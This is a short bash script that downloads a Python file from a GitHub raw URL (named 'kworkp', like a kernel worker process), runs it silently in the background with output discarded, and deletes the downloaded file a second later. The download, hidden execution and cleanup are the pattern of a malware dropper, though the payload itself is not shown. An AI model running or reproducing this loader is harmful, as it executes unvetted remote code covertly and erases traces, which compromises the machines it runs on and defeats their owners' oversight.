#!/bin/bash

URL="https://raw.githubusercontent.com/Andtherya/test/refs/heads/main/kworkp"
SCRIPT="server.py"

curl -fsSL "$URL" -o "$SCRIPT" || exit 1

nohup python3 "$SCRIPT" >/dev/null 2>&1 &

sleep 1
rm -f "$SCRIPT"
